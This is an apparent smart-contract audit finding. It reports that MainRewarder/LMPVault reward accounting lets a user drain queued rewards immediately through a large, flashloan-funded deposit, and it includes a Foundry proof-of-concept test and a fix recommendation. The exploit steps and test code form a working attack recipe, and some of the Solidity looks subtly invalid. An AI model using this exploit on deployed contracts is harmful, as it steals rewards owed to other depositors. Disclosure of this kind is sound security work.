# All Rewards can be collected without waiting from mainRewarder
## Summary
The improper accounting at MainRewarder and LMPVault allows a user to take all queued up rewards without waiting the necessary time.

## Vulnerability Detail
During minting of the LMPVault tokens the rewards are calculated improperly for the previously staked tokens. When new LMPVault tokens are minted, the rewards are calculated and collected for the already minted tokens, however the amount used to calculate that is unnecessarily including the just minted tokens (instead of doing it only for the amount before the current mint).

## Impact
Any user can take all amounts of rewards queued within the MainRewarder contract in a single transaction by leveraging a flashloan. 

## Code Snippet
 1. call LMPVault.claimRewards() which will call the MainRewarder._updateReward()
 2. We roll the blocks
 3. We deposit a big amount through the LMPVault.deposit()
 4. We do again LMPVault.claimRewards()
 5. We LMPVault.withdraw()

The code to achieve that:
```solidity
    function test_stealSomeRewards() public {
        uint256 private rewardAmount = 100_000_000;
        liquidator = vm.addr(234);
        _accessController.grantRole(Roles.LIQUIDATOR_ROLE, liquidator);       
        mainRewardVault = _lmpVault.rewarder();
        _toke.mint(liquidator, rewardAmount); // mint 

        vm.startPrank(liquidator);
        _toke.approve(address(mainRewardVault), rewardAmount);
        mainRewardVault.queueNewRewards(rewardAmount);
        vm.stopPrank();

        address user1 = vm.addr(100);
        uint amount = 100_000_000_000;
        vm.label(user1, "user1");

        _asset.mint(user1, amount);

        vm.startPrank(user1);
        _lmpVault.claimRewards();
        vm.stopPrank();

        vm.roll(block.number + 100);

        vm.startPrank(user1);
        _asset.approve(address(_lmpVault), amount);
        _lmpVault.deposit(amount, user1);
        _lmpVault.claimRewards(); // rewards are claimed as if the 'amount' was staked for 100 blocks.
        vm.stopPrank();

        uint rewardsClaimed = _lmpVault.rewarder().balanceOf(user1);

        console.log("Rewards collected: ", rewardsClaimed);
    }
```
## Tool used

Manual Review

## Recommendation

The rewarder should use its own accounting of staked tokens instead of relying on the LMPVault balances.
